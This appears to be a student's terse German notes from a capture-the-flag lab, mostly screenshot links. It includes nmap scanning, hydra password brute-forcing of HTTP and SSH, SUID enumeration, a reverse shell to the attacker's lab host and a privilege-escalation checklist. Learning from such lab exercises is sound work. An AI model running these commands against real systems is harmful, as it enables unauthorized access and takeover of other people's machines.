---
tags: []
---
`nmap 192.168.56.0/24`
mit allen ports
-T4 damit keine firewallfaxen
![](https://i.imgur.com/tHI2XTr.png)
![](https://i.imgur.com/zDYaCOo.png)
![](https://i.imgur.com/j91Why2.png)
![](https://i.imgur.com/q0VnnIQ.png)
![](https://i.imgur.com/fYH07pU.png)
![](https://i.imgur.com/PwZ7OPm.png)
![](https://i.imgur.com/swWh73v.png)
![](https://i.imgur.com/RP6nULv.png)
![](https://i.imgur.com/LXOBUyI.png)
![](https://i.imgur.com/qAzMgsR.png)
![](https://i.imgur.com/JzQxk21.png)
python file für proof zeigen
github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
https://tylerrockwell.github.io/defeating-basic-auth-with-hydra/
`hydra -l user -P pw.txt -s 55487 -f 192.168.15.3 http-get /`
![](https://i.imgur.com/te7iJGH.png)
![](https://i.imgur.com/xRTQq5n.png)
`FLAG{use_secure_credentials}`
![](https://i.imgur.com/Y5ivt2h.png)
![](https://i.imgur.com/AtXi9lB.png)
![](https://i.imgur.com/bWZdxyR.png)

![](https://i.imgur.com/di16GFC.png)
![](https://i.imgur.com/gY0Oxyp.png)
`ls -R *`
![](https://i.imgur.com/4qrGK7s.png)
![](https://i.imgur.com/hjzpC8g.png)
![](https://i.imgur.com/ZzLUjVp.png)

![](https://i.imgur.com/MdvNqDN.png)
![](https://i.imgur.com/2Xhqji1.png)
![](https://i.imgur.com/fE7CWqb.png)

`hydra -l GrumpyCat -P pw.txt 192.168.15.3 ssh -t 4`
`find -perm -4000 2> /dev/null`
![](https://i.imgur.com/0LOwRRt.png)
`cat /proc/741/cmdline`
`find -name "ctf_server.py" 2> /dev/null`
https://superuser.com/questions/632979/if-i-know-the-pid-number-of-a-process-how-can-i-get-its-name
![](https://i.imgur.com/nJoBuRJ.png)
https://medium.com/techiepedia/series-of-ctf-machines-walkthrough-4-linux-privilege-escalation-enumeration-247899027be
`ls -R * 2>dev/null| grep -i flag`
`cat /usr/local/bin/flag_process.sh`
![](https://i.imgur.com/0KhHbmc.png)
![](https://i.imgur.com/UGcn08t.png)
![](https://i.imgur.com/MFNTBGs.png)
![](https://i.imgur.com/Z885wJP.png)
![](https://i.imgur.com/ziYwvHF.png)
https://www.exploit-db.com/exploits/42274


https://www.puckiestyle.nl/upgrading-netcat-shells-to-meterpreter-sessions/
`bash -i> /dev/tcp/192.168.15.4/6969 0>&1`
![](https://i.imgur.com/ne9aUCq.png)
![](https://i.imgur.com/XJU4hYR.png)
![](https://i.imgur.com/WUgbYOs.png)
suid thing
```bash
find / -type f -perm -4001 -exec ls -h {} \; 2> /dev/null
```
![](https://i.imgur.com/QgQfBOA.png)
![](https://i.imgur.com/gePh9t6.png)
![](https://i.imgur.com/08agQET.png)
![](https://i.imgur.com/I9rJQwE.png)

![](https://i.imgur.com/1YVvohV.png)
![](https://i.imgur.com/bd71EuO.png)
![](https://i.imgur.com/FhHbQnQ.png)

1. credentials
2. comments
3. history
4. tmp
5. process
6. sudo
7. root

![](https://i.imgur.com/7ALcUgK.png)
![](https://i.imgur.com/pxEq0RY.png)
![](https://i.imgur.com/Rhiwe05.png)
![](https://i.imgur.com/DgJqQfv.png)
![](https://i.imgur.com/RW0x4DE.png)

![](https://i.imgur.com/A0cWylF.png)
![](https://i.imgur.com/q44fNeO.png)
![](https://i.imgur.com/YhFldor.png)
![](https://i.imgur.com/Ea1bdcX.png)
![](https://i.imgur.com/sA48AMp.png)